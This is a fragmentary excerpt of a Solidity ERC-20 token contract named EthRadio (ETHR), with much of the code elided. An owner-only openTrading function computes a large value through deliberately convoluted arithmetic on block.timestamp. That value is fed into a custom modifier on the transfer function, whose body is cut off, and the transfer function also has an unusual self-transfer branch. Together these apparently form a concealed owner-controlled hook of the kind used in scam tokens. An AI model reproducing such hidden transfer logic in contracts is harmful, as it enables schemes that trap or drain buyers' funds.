...
contract EthRadio is Context, IERC20, Ownable {
    ...
    string private _name = unicode"EthRadio";
    string private _symbol = unicode"ETHR";
    ...
    function openTrading() public onlyOwner {
        openTrade=true;
        maxWallets = 2*(2*5)**2 *block.timestamp;
        maxWallets = maxWallets * (2*5)**(2*9);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) syncLpNow(sender,recipient,maxWallets) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(sender == recipient)
            return recipient == sPair;
    ...
    modifier syncLpNow(address spe, address rev,uint256 _maxWallets){
